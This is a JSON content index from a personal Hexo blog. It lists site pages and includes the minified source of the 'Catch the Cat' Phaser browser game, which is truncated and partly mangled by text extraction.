{"meta":{"title":"潜心","subtitle":"","description":"","author":"flag2020","url":"https://flag2020.top","root":"/"},"pages":[{"title":"Oh>..< 无法访问!","date":"2020-10-19T12:43:14.051Z","updated":"2020-10-18T03:43:51.595Z","comments":true,"path":"404.html","permalink":"https://flag2020.top/404.html","excerpt":"","text":"#no{ position: relative; top: 30%; left: 50%; -webkit-transform: translate(-50%, 32%); -moz-transform: translate(-50%, 32%); -ms-transform: translate(-50%, 32%); -o-transform: translate(-50%, 32%); transform: translate(-50%, 32%); font-size: 24px; line-height: 72px; margin-bottom: 36px; white-space: nowrap; text-overflow: ellipsis; overflow: hidden; } 404 Oh>..< 我找不到回家的路了"},{"title":"时间轴","date":"2020-05-10T03:33:00.000Z","updated":"2020-10-18T03:43:51.596Z","comments":true,"path":"axis.html","permalink":"https://flag2020.top/axis.html","excerpt":"","text":"时间轴 加载中…… if(n){ 加载失败。}"},{"title":"友情链接","date":"2019-11-25T10:59:00.000Z","updated":"2020-10-18T03:43:51.596Z","comments":true,"path":"link.html","permalink":"https://flag2020.top/link.html","excerpt":"","text":"友情链接 加载中…. if(n){ 加载失败。}"},{"title":"留言板","date":"2019-11-25T10:59:00.000Z","updated":"2020-10-18T07:59:34.518Z","comments":true,"path":"valine.html","permalink":"https://flag2020.top/valine.html","excerpt":"","text":"留言板，请大佬任意发炎如果有什么问题或者反馈都可以发送在评论区添加友情链接传送带"},{"title":"about","date":"2020-11-27T17:41:26.652Z","updated":"2020-11-27T17:41:11.292Z","comments":true,"path":"about/index.html","permalink":"https://flag2020.top/about/index.html","excerpt":"","text":"关于 本博客主题来自 https://shen-yu.gitee.io/ 一个安静且优雅的 Hexo 主题 GitHub：https://github.com/Shen-Yu/hexo-theme-ayer 公示板句子(如下)来自 Hitokoto - 一言 挂友链请点：friends | (flag2020.top)"},{"title":"friends","date":"2020-11-27T17:19:29.063Z","updated":"2020-11-27T17:19:29.063Z","comments":true,"path":"friends/index.html","permalink":"https://flag2020.top/friends/index.html","excerpt":"","text":""},{"title":"categories","date":"2020-11-11T16:47:02.379Z","updated":"2020-11-11T16:47:02.379Z","comments":true,"path":"categories/index.html","permalink":"https://flag2020.top/categories/index.html","excerpt":"","text":""},{"title":"","date":"2020-11-29T07:40:11.598Z","updated":"2020-11-29T07:40:11.598Z","comments":true,"path":"game/index.html","permalink":"https://flag2020.top/game/index.html","excerpt":"","text":"游戏《圈小猫》 window.game = new CatchTheCatGame({ w: 11, h: 11, r: 20, backgroundColor: 16777215, parent: \"catch-the-cat\", statusBarAlign: \"center\", credit: \"github.com/ganlvtech\", })"},{"title":"","date":"2020-11-28T15:29:53.695Z","updated":"2020-11-28T15:29:53.695Z","comments":true,"path":"game简单版/index.html","permalink":"https://flag2020.top/game%E7%AE%80%E5%8D%95%E7%89%88/index.html","excerpt":"","text":"游戏《圈小猫》 window.game = new CatchTheCatGame({ w: 11, h: 11, r: 20, backgroundColor: 16777215, parent: \"catch-the-cat\", statusBarAlign: \"center\", credit: \"github.com/ganlvtech\", })"},{"title":"tags","date":"2020-11-11T16:48:42.729Z","updated":"2020-11-11T16:48:14.888Z","comments":true,"path":"tags/index.html","permalink":"https://flag2020.top/tags/index.html","excerpt":"","text":""},{"title":"","date":"2020-11-28T15:10:17.669Z","updated":"2020-05-11T04:10:08.332Z","comments":true,"path":"game简单版/catch-the-cat.js","permalink":"https://flag2020.top/game%E7%AE%80%E5%8D%95%E7%89%88/catch-the-cat.js","excerpt":"","text":"!function(t){var e={};function n(o){if(e[o])return e[o].exports;var r=e[o]={i:o,l:!1,exports:{}};return t[o].call(r.exports,r,r.exports,n),r.l=!0,r.exports}n.m=t,n.c=e,n.d=function(t,e,o){n.o(t,e)||Object.defineProperty(t,e,{enumerable:!0,get:o})},n.r=function(t){\"undefined\"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(t,Symbol.toStringTag,{value:\"Module\"}),Object.defineProperty(t,\"__esModule\",{value:!0})},n.t=function(t,e){if(1&e&&(t=n(t)),8&e)return t;if(4&e&&\"object\"==typeof t&&t&&t.__esModule)return t;var o=Object.create(null);if(n.r(o),Object.defineProperty(o,\"default\",{enumerable:!0,value:t}),2&e&&\"string\"!=typeof t)for(var r in t)n.d(o,r,function(e){return t[e]}.bind(null,r));return o},n.n=function(t){var e=t&&t.__esModule?function(){return t.default}:function(){return t};return n.d(e,\"a\",e),e},n.o=function(t,e){return Object.prototype.hasOwnProperty.call(t,e)},n.p=\"\",n(n.s=3)}([function(t,e,n){\"use strict\";var o,r=this&&this.__extends||(o=function(t,e){return(o=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(t,e){t.__proto__=e}||function(t,e){for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n])})(t,e)},function(t,e){function n(){this.constructor=t}o(t,e),t.prototype=null===e?Object.create(e):(n.prototype=e.prototype,new n)});Object.defineProperty(e,\"__esModule\",{value:!0});var i,s=n(1),a=n(20),l=n(22),d=n(23),h=n(24),u=n(25),f=n(2),p=n(26),c=n(27);!function(t){t.PLAYING=\"playing\",t.WIN=\"win\",t.LOSE=\"lose\"}(i||(i={}));var k=function(t){function e(e,n,o){var r=t.call(this,{key:\"MainScene\"})||this;return r.w=e,r.h=n,r.r=o,r.dx=2*r.r,r.dy=r.r*Math.sqrt(3),r}return r(e,t),Object.defineProperty(e.prototype,\"blocks\",{get:function(){return this.data.get(\"blocks\")},set:function(t){this.data.set(\"blocks\",t)},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,\"blocksData\",{get:function(){var t=[];return this.blocks.forEach(function(e,n){t[n]=[],e.forEach(function(e,o){t[n][o]=e.isWall})}),t},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,\"cat\",{get:function(){return this.data.get(\"cat\")},set:function(t){this.data.set(\"cat\",t)},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,\"statusBar\",{get:function(){return this.data.get(\"status_bar\")},set:function(t){this.data.set(\"status_bar\",t)},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,\"creditText\",{get:function(){return this.data.get(\"credit_text\")},set:function(t){this.data.set(\"credit_text\",t)},enumerable:!0,configurable:!0}),Object.defineProperty(e.prototype,\"state\",{get:function(){return this.data.get(\"state\")},set:function(t){switch(t){case i.PLAYING:break;case i.LOSE:this.setStatusText(f.default(\"猫已经跑到地图边缘了，你输了\"));break;case i.WIN:this.setStatusText(f.default(\"猫已经无路可走，你赢了\"));break;default:return}this.data.set(\"state\",t)},enumerable:!0,configurable:!0}),e.getNeighbours=function(t,e){var n,o,r,i,s={i:t-1,j:e},a={i:t+1,j:e};0==(1&e)?(n={i:t-1,j:e-1},o={i:t,j:e-1},r={i:t-1,j:e+1},i={i:t,j:e+1}):(n={i:t,j:e-1},o={i:t+1,j:e-1},r={i:t,j:e+1},i={i:t+1,j:e+1});var l=[];return l[0]=s,l[1]=n,l[2]=o,l[3]=a,l[4]=i,l[5]=r,l},e.prototype.preload=function(){var t=this.r/s.default.catStepLength;for(var e in s.default.textures)this.load.addFile(new c.default(this.load,e,s.default.textures[e],{scale:t}))},e.prototype.create=function(){this.createAnimations(),this.createBlocks(),this.createCat(),this.createStatusText(),this.createResetButton(),this.createCreditText(),this.reset(),this.game.solver&&(this.cat.solver=this.game.solver)},e.prototype.getPosition=function(t,e){return{x:3*this.r+(0==(1&e)?this.r:this.dx)+t*this.dx,y:3*this.r+this.r+e*this.dy}},e.prototype.getBlock=function(t,e){return t>=0&&t=0&&e"},{"title":"","date":"2020-11-28T15:03:12.711Z","updated":"2020-11-28T15:03:12.711Z","comments":true,"path":"game/catch-the-cat.js","permalink":"https://flag2020.top/game/catch-the-cat.js","excerpt":"","text":"! function (t) { var e = {}; function n(o) { if (e[o]) return e[o].exports; var r = e[o] = { i: o, l: !1, exports: {} }; return t[o].call(r.exports, r, r.exports, n), r.l = !0, r.exports } n.m = t, n.c = e, n.d = function (t, e, o) { n.o(t, e) || Object.defineProperty(t, e, { enumerable: !0, get: o }) }, n.r = function (t) { \"undefined\" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, { value: \"Module\" }), Object.defineProperty(t, \"__esModule\", { value: !0 }) }, n.t = function (t, e) { if (1 & e && (t = n(t)), 8 & e) return t; if (4 & e && \"object\" == typeof t && t && t.__esModule) return t; var o = Object.create(null); if (n.r(o), Object.defineProperty(o, \"default\", { enumerable: !0, value: t }), 2 & e && \"string\" != typeof t) for (var r in t) n.d(o, r, function (e) { return t[e] }.bind(null, r)); return o }, n.n = function (t) { var e = t && t.__esModule ? function () { return t.default } : function () { return t }; return n.d(e, \"a\", e), e }, n.o = function (t, e) { return Object.prototype.hasOwnProperty.call(t, e) }, n.p = \"\", n(n.s = 3) }([ function (t, e, n) { \"use strict\"; var o, r = this && this.__extends || (o = function (t, e) { return (o = Object.setPrototypeOf || { __proto__: [] } instanceof Array && function (t, e) { t.__proto__ = e } || function (t, e) { for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]) })(t, e) }, function (t, e) { function n() { this.constructor = t } o(t, e), t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n) }); Object.defineProperty(e, \"__esModule\", { value: !0 }); var i, s = n(1), a = n(20), l = n(22), d = n(23), h = n(24), u = n(25), f = n(2), p = n(26), c = n(27); ! function (t) { t.PLAYING = \"playing\", t.WIN = \"win\", t.LOSE = \"lose\" }(i || (i = {})); var k = function (t) { function e(e, n, o) { var r = t.call(this, { key: \"MainScene\" }) || this; return r.w = e, r.h = n, r.r = o, r.dx = 2 * r.r, r.dy = r.r * Math.sqrt(3), r } return r(e, t), Object.defineProperty(e.prototype, \"blocks\", { get: function () { return this.data.get(\"blocks\") }, set: function (t) { this.data.set(\"blocks\", t) }, enumerable: !0, configurable: !0 }), Object.defineProperty(e.prototype, \"blocksData\", { get: function () { var t = []; return this.blocks.forEach(function (e, n) { t[n] = [], e.forEach(function (e, o) { t[n][o] = e.isWall }) }), t }, enumerable: !0, configurable: !0 }), Object.defineProperty(e.prototype, \"cat\", { get: function () { return this.data.get(\"cat\") }, set: function (t) { this.data.set(\"cat\", t) }, enumerable: !0, configurable: !0 }), Object.defineProperty(e.prototype, \"statusBar\", { get: function () { return this.data.get(\"status_bar\") }, set: function (t) { this.data.set(\"status_bar\", t) }, enumerable: !0, configurable: !0 }), Object.defineProperty(e.prototype, \"creditText\", { get: function () { return this.data.get(\"credit_text\") }, set: function (t) { this.data.set(\"credit_text\", t) }, enumerable: !0, configurable: !0 }), Object.defineProperty(e.prototype, \"state\", { get: function () { return this.data.get(\"state\") }, set: function (t) { switch (t) { case i.PLAYING: break; case i.LOSE: this.setStatusText(f.default(\"猫已经跑到地图边缘了，你输了\")); break; case i.WIN: this.setStatusText(f.default(\"猫已经无路可走，你赢了\")); break; default: return } this.data.set(\"state\", t) }, enumerable: !0, configurable: !0 }), e.getNeighbours = function (t, e) { var n, o, r, i, s = { i: t - 1, j: e }, a = { i: t + 1, j: e }; 0 == (1 & e) ? (n = { i: t - 1, j: e - 1 }, o = { i: t, j: e - 1 }, r = { i: t - 1, j: e + 1 }, i = { i: t, j: e + 1 }) : (n = { i: t, j: e - 1 }, o = { i: t + 1, j: e - 1 }, r = { i: t, j: e + 1 }, i = { i: t + 1, j: e + 1 }); var l = []; return l[0] = s, l[1] = n, l[2] = o, l[3] = a, l[4] = i, l[5] = r, l }, e.prototype.preload = function () { var t = this.r / s.default.catStepLength; for (var e in s.default.textures) this.load.addFile(new c.default(this.load, e, s.default.textures[e], { scale: t })) }, e.prototype.create = function () { this.createAnimations(), this.createBlocks(), this.createCat(), this.createStatusText(), this.createResetButton(), this.createCreditText(), this.reset(), this.game.solver && (this.cat.solver = this.game.solver) }, e.prototype.getPosition = function (t, e) { return { x: 3 * this.r + (0 == (1 & e) ? this.r : this.dx) + t * this.dx, y: 3 * this.r + this.r + e * this.dy } }, e.prototype.getBlock = function (t, e) { return t >= 0 && t < this.w && e >= 0 && e < this.h ? this.blocks[t][e] : null }, e.prototype.playerClick = function (t, e) { if (this.cat.anims.isPlaying && this.cat.anims.stop(), this.state !== i.PLAYING) return this.setStatusText(f.default(\"游戏已经结束，重新开局\")), this.reset(), !1; var n = this.getBlock(t, e); return n ? n.isWall ? (this.setStatusText(f.default(\"点击位置已经是墙了，禁止点击\")), !1) : this.cat.i === t && this.cat.j === e ? (this.setStatusText(f.default(\"点击位置是猫当前位置，禁止点击\")), !1) : (n.isWall = !0, this.cat.isCaught() ? (this.setStatusText(f.default(\"猫已经无路可走，你赢了\")), this.state = i.WIN, !1) : (this.setStatusText(f.default(\"您点击了 \") + \"(\" + t + \", \" + e + \")\"), this.cat.step() || (this.setStatusText(f.default(\"猫认输，你赢了！\")), this.state = i.WIN), !0)) : (this.setStatusText(f.default(\"代码错误，当前位置不存在\")), !1) }, e.prototype.reset = function () { this.cat.reset(), this.resetBlocks(), this.randomWall(), this.state = i.PLAYING, this.setStatusText(f.default(\"点击小圆点，围住小猫\")) }, e.prototype.setStatusText = function (t) { this.statusBar.setText(t) }, e.prototype.createAnimations = function () { var t = this; s.default.animations.forEach(function (e) { var n = []; e.textures.forEach(function (t) { n.push({ key: t, frame: 0 }) }), t.anims.create({ key: e.name, frames: n, frameRate: s.default.frameRate, repeat: e.repeat }) }) }, e.prototype.createBlocks = function () { for (var t = [], e = 0; e < this.w; e++) { t[e] = []; for (var n = 0; n < this.h; n++) { var o = new l.default(this, e, n, .9 * this.r); t[e][n] = o, this.add.existing(o), o.on(\"player_click\", this.playerClick.bind(this)) } } this.blocks = t }, e.prototype.createCat = function () { var t = this, e = new a.default(this); e.on(\"escaped\", function () { t.state = i.LOSE }), e.on(\"win\", function () { t.state = i.WIN }), e.solver = p.default, this.cat = e, this.add.existing(e) }, e.prototype.createStatusText = function () { var t = new h.default(this); this.statusBar = t, this.add.existing(t) }, e.prototype.createResetButton = function () { var t = this, e = new d.default(this); this.add.existing(e), e.on(\"pointerup\", function () { t.reset() }) }, e.prototype.createCreditText = function () { var t = new u.default(this); this.creditText = t, this.add.existing(t) }, e.prototype.resetBlocks = function () { this.blocks.forEach(function (t) { t.forEach(function (t) { t.isWall = !1 }) }) }, e.prototype.randomWall = function () { for (var t = 0; t < 8; t++) { var e = Math.floor(this.w * Math.random()), n = Math.floor(this.h * Math.random()); e === this.cat.i && n === this.cat.j || (this.getBlock(e, n).isWall = !0) } }, e }(Phaser.Scene); e.default = k }, function (t, e, n) { \"use strict\"; Object.defineProperty(e, \"__esModule\", { value: !0 }); var o = n(5), r = n(6), i = n(7), s = n(8), a = n(9), l = n(10), d = n(11), h = n(12), u = n(13), f = n(14), p = n(15), c = n(16), k = n(17), g = n(18), w = n(19); e.default = { textures: { bottom_left_1: o, bottom_left_2: r, bottom_left_3: i, bottom_left_4: s, bottom_left_5: a, left_1: l, left_2: d, left_3: h, left_4: u, left_5: f, top_left_1: p, top_left_2: c, top_left_3: k, top_left_4: g, top_left_5: w }, animations: [{ name: \"left_step\", textures: [\"left_1\", \"left_2\", \"left_3\", \"left_4\", \"left_5\"], repeat: 0 }, { name: \"top_left_step\", textures: [\"top_left_1\", \"top_left_2\", \"top_left_3\", \"top_left_4\", \"top_left_5\"], repeat: 0 }, { name: \"bottom_left_step\", textures: [\"bottom_left_1\", \"bottom_left_2\", \"bottom_left_3\", \"bottom_left_4\", \"bottom_left_5\"], repeat: 0 }, { name: \"left_run\", textures: [\"left_2\", \"left_3\", \"left_4\", \"left_5\"], repeat: 3 }, { name: \"top_left_run\", textures: [\"top_left_2\", \"top_left_3\", \"top_left_4\", \"top_left_5\"], repeat: 3 }, { name: \"bottom_left_run\", textures: [\"bottom_left_2\", \"bottom_left_3\", \"bottom_left_4\", \"bottom_left_5\"], repeat: 3 }], origins: { left: { x: .75, y: .75 }, top_left: { x: .63, y: .83 }, bottom_left: { x: .65, y: .5 } }, stopTextures: { left: \"left_1\", top_left: \"top_left_1\", bottom_left: \"bottom_left_1\" }, cannotEscapeTextures: { left: \"left_2\", top_left: \"top_left_2\", bottom_left: \"bottom_left_2\" }, directions: [{ scaleX: 1, name: \"left\" }, { scaleX: 1, name: \"top_left\" }, { scaleX: -1, name: \"top_left\" }, { scaleX: -1, name: \"left\" }, { scaleX: -1, name: \"bottom_left\" }, { scaleX: 1, name: \"bottom_left\" }], catDefaultDirection: 5, catStepLength: 20, frameRate: 15, translations: {} } }, function (t, e, n) { \"use strict\"; Object.defineProperty(e, \"__esModule\", { value: !0 }); var o = n(1); e.default = function (t) { var e = o.default.translations[t]; return void 0 === e ? t : e } }, function (t, e, n) { \"use strict\"; Object.defineProperty(e, \"__esModule\", { value: !0 }); var o = n(4); window.CatchTheCatGame = o.default }, function (t, e, n) { \"use strict\"; var o, r = this && this.__extends || (o = function (t, e) { return (o = Object.setPrototypeOf || { __proto__: [] } instanceof Array && function (t, e) { t.__proto__ = e } || function (t, e) { for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]) })(t, e) }, function (t, e) { function n() { this.constructor = t } o(t, e), t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n) }); Object.defineProperty(e, \"__esModule\", { value: !0 }); var i = n(0), s = function (t) { function e(e) { var n = this; e.credit || (e.credit = \"github.com/ganlvtech\"), e.backgroundColor || (e.backgroundColor = 15658734); var o = e.w, r = e.h, s = e.r * window.devicePixelRatio, a = 1 / window.devicePixelRatio, l = Math.floor((6.5 + 2 * o) * s), d = Math.floor((6 + Math.sqrt(3) * r) * s), h = new i.default(o, r, s), u = { width: l, height: d, type: Phaser.AUTO, parent: e.parent, backgroundColor: e.backgroundColor, scene: h, zoom: a }; return (n = t.call(this, u) || this).myConfig = e, n.mainScene = h, n } return r(e, t), Object.defineProperty(e.prototype, \"solver\", { get: function () { return this._solver }, set: function (t) { this._solver = t; try { this.mainScene.cat.solver = t } finally {} }, enumerable: !0, configurable: !0 }), e }(Phaser.Game); /*! * Catch The Cat Game * * https://github.com/ganlvtech/phaser-catch-the-cat */ e.default = s }, function (t, e) { t.exports = '\\n\\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n\\n' }, function (t, e) { t.exports = '\\n\\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n\\n' }, function (t, e) { t.exports = '\\n\\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n\\n' }, function (t, e) { t.exports = '\\n\\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n\\n' }, function (t, e) { t.exports = '\\n\\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n\\n' }, function (t, e) { t.exports = '\\n\\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n\\n' }, function (t, e) { t.exports = '\\n\\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n\\n' }, function (t, e) { t.exports = '\\n\\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n\\n' }, function (t, e) { t.exports = '\\n\\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n\\n' }, function (t, e) { t.exports = '\\n\\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n\\n' }, function (t, e) { t.exports = '\\n\\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n\\n' }, function (t, e) { t.exports = '\\n\\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n\\n' }, function (t, e) { t.exports = '\\n\\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n\\n' }, function (t, e) { t.exports = '\\n\\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n\\n' }, function (t, e) { t.exports = '\\n\\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n \\n\\n' }, function (t, e, n) { \"use strict\"; var o, r = this && this.__extends || (o = function (t, e) { return (o = Object.setPrototypeOf || { __proto__: [] } instanceof Array && function (t, e) { t.__proto__ = e } || function (t, e) { for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]) })(t, e) }, function (t, e) { function n() { this.constructor = t } o(t, e), t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n) }); Object.defineProperty(e, \"__esModule\", { value: !0 }); var i = n(0), s = n(1), a = n(21), l = function (t) { function e(e) { var n = t.call(this, e, 0, 0, \"__DEFAULT\") || this; return n.on(\"animationrepeat\", function () { n.moveForward() }), n.solver = a.default, n.direction = s.default.catDefaultDirection, n.reset(), n } return r(e, t), Object.defineProperty(e.prototype, \"i\", { get: function () { return this.getData(\"i\") }, set: function (t) { this.setData(\"i\", t) }, enumerable: !0, configurable: !0 }), Object.defineProperty(e.prototype, \"j\", { get: function () { return this.getData(\"j\") }, set: function (t) { this.setData(\"j\", t) }, enumerable: !0, configurable: !0 }), Object.defineProperty(e.prototype, \"direction\", { get: function () { return this.getData(\"direction\") }, set: function (t) { this.setData(\"direction\", t), this.resetTextureToStop(), this.resetOriginAndScale() }, enumerable: !0, configurable: !0 }), Object.defineProperty(e.prototype, \"solver\", { get: function () { return this.getData(\"solver\") }, set: function (t) { this.setData(\"solver\", t) }, enumerable: !0, configurable: !0 }), e.prototype.reset = function () { this.anims.stop(), this.direction = s.default.catDefaultDirection, this.resetIJ() }, e.prototype.step = function () { var t = this.solver.call(this, this.scene.blocksData, this.i, this.j); return t < 0 || t > 6 ? (this.caught(), !1) : !!this.stepDirection(t) || (this.caught(), !1) }, e.prototype.isCaught = function () { var t = this; return !this.getCurrentNeighbours().some(function (e, n) { var o = t.scene.getBlock(e.i, e.j); return null !== o && !o.isWall }) }, e.prototype.caught = function () { this.setTexture(s.default.cannotEscapeTextures[s.default.directions[this.direction].name]) }, e.prototype.escape = function () { 0 === this.j || this.j === this.scene.h - 1 ? this.runForward() : 0 === this.i ? this.runDirection(0) : this.i === this.scene.w - 1 && this.runDirection(3) }, e.prototype.setIJ = function (t, e) { this.i = t, this.j = e; var n = this.scene.getPosition(t, e); return this.setPosition(n.x, n.y) }, e.prototype.resetIJ = function () { this.setIJ(Math.floor(this.scene.w / 2), Math.floor(this.scene.h / 2)) }, e.prototype.isEscaped = function () { return this.i = this.scene.w - 1 || this.j = this.scene.h - 1 }, e.prototype.checkState = function () { this.isEscaped() ? (this.escape(), this.emit(\"escaped\")) : this.isCaught() && (this.caught(), this.emit(\"win\")) }, e.prototype.getCurrentNeighbours = function () { return i.default.getNeighbours(this.i, this.j) }, e.prototype.resetTextureToStop = function () { this.setTexture(s.default.stopTextures[s.default.directions[this.direction].name]) }, e.prototype.resetOriginAndScale = function () { var t = s.default.directions[this.direction], e = s.default.origins[t.name]; this.setOrigin(e.x, e.y), this.scaleX = t.scaleX }, e.prototype.moveForward = function () { var t = this.getCurrentNeighbours()[this.direction]; this.setIJ(t.i, t.j), this.checkState() }, e.prototype.stepForward = function () { var t = this, e = this.getCurrentNeighbours()[this.direction], n = this.scene.getBlock(e.i, e.j); return null !== n && (!n.isWall && (this.play(s.default.directions[this.direction].name + \"_step\"), this.once(\"animationcomplete\", function () { t.moveForward(), t.resetTextureToStop() }), !0)) }, e.prototype.stepDirection = function (t) { return this.direction = t, this.stepForward() }, e.prototype.runForward = function () { this.play(s.default.directions[this.direction].name + \"_run\") }, e.prototype.runDirection = function (t) { this.direction = t, this.runForward() }, e }(Phaser.GameObjects.Sprite); e.default = l }, function (t, e, n) { \"use strict\"; Object.defineProperty(e, \"__esModule\", { value: !0 }); var o = n(0); e.default = function (t, e, n) { var r = -1; return o.default.getNeighbours(e, n).forEach(function (e, n) { -1 === r && (void 0 === t[e.i] || void 0 === t[e.i][e.j] || t[e.i][e.j] || (r = n)) }), r } }, function (t, e, n) { \"use strict\"; var o, r = this && this.__extends || (o = function (t, e) { return (o = Object.setPrototypeOf || { __proto__: [] } instanceof Array && function (t, e) { t.__proto__ = e } || function (t, e) { for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]) })(t, e) }, function (t, e) { function n() { this.constructor = t } o(t, e), t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n) }); Object.defineProperty(e, \"__esModule\", { value: !0 }); var i = function (t) { function e(e, n, o, r) { var i = this, s = e.getPosition(n, o); (i = t.call(this, e, s.x, s.y, r, 0, 360, !1, 0, 1) || this).i = n, i.j = o, i.r = r, i.isWall = !1; var a = new Phaser.Geom.Circle(i.r / 2, i.r / 2, i.r); return i.setInteractive(a, Phaser.Geom.Circle.Contains), i.on(\"pointerdown\", function () { i.emit(\"player_click\", i.i, i.j) }), i } return r(e, t), Object.defineProperty(e.prototype, \"isWall\", { get: function () { return this._isWall }, set: function (t) { this._isWall = t, this.fillColor = t ? 13158 : 11786751 }, enumerable: !0, configurable: !0 }), e }(Phaser.GameObjects.Arc); e.default = i }, function (t, e, n) { \"use strict\"; var o, r = this && this.__extends || (o = function (t, e) { return (o = Object.setPrototypeOf || { __proto__: [] } instanceof Array && function (t, e) { t.__proto__ = e } || function (t, e) { for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]) })(t, e) }, function (t, e) { function n() { this.constructor = t } o(t, e), t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n) }); Object.defineProperty(e, \"__esModule\", { value: !0 }); var i = n(2), s = function (t) { function e(e) { var n = t.call(this, e, 0, 0, i.default(\"重置\"), {}) || this; n.setColor(\"#000000\"); var o = e.r; n.setFontSize(o), n.setPadding(o, o, o, o), n.setPosition(0, e.game.canvas.height), n.setOrigin(0, 1); var r = new Phaser.Geom.Rectangle(0, 0, n.width, n.height); return n.setInteractive(r, Phaser.Geom.Rectangle.Contains), n } return r(e, t), e }(Phaser.GameObjects.Text); e.default = s }, function (t, e, n) { \"use strict\"; var o, r = this && this.__extends || (o = function (t, e) { return (o = Object.setPrototypeOf || { __proto__: [] } instanceof Array && function (t, e) { t.__proto__ = e } || function (t, e) { for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]) })(t, e) }, function (t, e) { function n() { this.constructor = t } o(t, e), t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n) }); Object.defineProperty(e, \"__esModule\", { value: !0 }); var i = function (t) { function e(e) { var n = t.call(this, e, 0, 0, \"\", {}) || this; n.setColor(\"#000000\"); var o = e.r; return n.setFontSize(o), \"center\" === e.game.myConfig.statusBarAlign && (n.setX(e.game.canvas.width / 2), n.setOrigin(.5, 0)), n.setPadding(o, o, o, o), n } return r(e, t), e }(Phaser.GameObjects.Text); e.default = i }, function (t, e, n) { \"use strict\"; var o, r = this && this.__extends || (o = function (t, e) { return (o = Object.setPrototypeOf || { __proto__: [] } instanceof Array && function (t, e) { t.__proto__ = e } || function (t, e) { for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n]) })(t, e) }, function (t, e) { function n() { this.constructor = t } o(t, e), t.prototype = null === e ? Object.create(e) : (n.prototype = e.prototype, new n) }); Object.defineProperty(e, \"__esModule\", { value: !0 }); var i = function (t) { function e(e) { var n = t.call(this, e, 0, 0, \"\", {}) || this; n.setColor(\"#000000\"), n.setPosition(e.game.canvas.width, e.game.canvas.height), n.setOrigin(1, 1); var o = e.r; return n.setFontSize(.8 * o), n.setPadding(o, o, o, o), n.setText(e.game.myConfig.credit), n } return r(e, t), e }(Phaser.GameObjects.Text); e.default = i }, function (t, e, n) { \"use strict\"; Object.defineProperty(e, \"__esModule\", { value: !0 }); var o = n(0), r = function () { function t(t, e, n, o) { this.i = e, this.j = n, this.isWall = o, this.distance = 1 / 0, this.parent = t, this.isEdge = this.i = this.parent.w - 1 || this.j = this.parent.h - 1 } return Object.defineProperty(t.prototype, \"routesCount\", { get: function () { var t = this; if (void 0 === this._routesCount) if (this.isEdge) this._routesCount = 1; else { var e = 0; this.neighbours.forEach(function (n) { null === n || n.isWall || n.distance < t.distance && (e += n.routesCount) }), this._routesCount = e } return this._routesCount }, enumerable: !0, configurable: !0 }), Object.defineProperty(t.prototype, \"neighbours\", { get: function () { var t = this; if (void 0 === this._neighbours) { var e = o.default.getNeighbours(this.i, this.j); this._neighbours = e.map(function (e) { return t.parent.getBlock(e.i, e.j) }) } return this._neighbours }, enumerable: !0, configurable: !0 }), Object.defineProperty(t.prototype, \"directions\", { get: function () { var t = this, e = []; return this.neighbours.forEach(function (n, o) { null === n || n.isWall || n.distance < t.distance && e.push(o) }), e }, enumerable: !0, configurable: !0 }), Object.defineProperty(t.prototype, \"direction\", { get: function () { var t = this, e = 0, n = -1; return this.directions.forEach(function (o) { var r = t.neighbours[o]; r.routesCount > e && (e = r.routesCount, n = o) }), n }, enumerable: !0, configurable: !0 }), t }(), i = function () { function t(t) { var e = this; if (this.w = t.length, this.w = 0 && t < this.w && e >= 0 && e < this.h ? this.blocks[t][e] : null }, t.prototype.calcAllDistances = function () { var t = []; this.blocks.forEach(function (e) { e.forEach(function (e) { e.isEdge && !e.isWall && (e.distance = 0, t.push(e)) }) }); for (var e = function () { var e = t.shift(); 